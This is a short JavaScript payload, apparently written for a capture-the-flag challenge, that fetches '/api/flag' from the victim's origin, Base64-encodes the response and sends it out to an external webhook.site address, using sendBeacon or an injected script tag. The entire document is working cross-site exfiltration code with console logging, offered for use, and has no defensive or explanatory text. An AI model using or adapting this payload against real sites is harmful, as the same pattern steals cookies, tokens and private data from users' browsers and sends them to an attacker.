(function leakViaXhr() {
    console.info('[leakViaXhr] Init');
  
    try {
      var xhr = new XMLHttpRequest();
      xhr.open('GET', '/api/flag', true);
      xhr.onreadystatechange = function() {
        if (xhr.readyState !== 4) return;
  
        if (xhr.status === 200) {
          console.info('[leakViaXhr] Received flag');
  
          try {
            var flag = xhr.responseText;
            var encoded = window.btoa(flag);
            console.info('[leakViaXhr] Encoded to Base64');
  
            var webhook = 'https://webhook.site/3df76daf-e1e5-446a-a667-c75476306fc2/';
            var payload = 'cookie=' + encodeURIComponent(encoded);
            var url = webhook + '?' + payload;
  
            // Use sendBeacon if supported
            if (navigator.sendBeacon) {
              var ok = navigator.sendBeacon(url);
              console.info('[leakViaXhr] sendBeacon returned', ok);
            } else {
              // Fallback: inject a <script> tag
              var s = document.createElement('script');
              s.src = url;
              document.head.appendChild(s);
              console.info('[leakViaXhr] Script-beacon injected');
            }
          } catch (encodeErr) {
            console.error('[leakViaXhr] Encoding or beacon error', encodeErr);
          }
  
        } else {
          console.error('[leakViaXhr] Server responded', xhr.status);
        }
      };
  
      xhr.send();
    } catch (err) {
      console.error('[leakViaXhr] XHR setup failed', err);
    }
  })();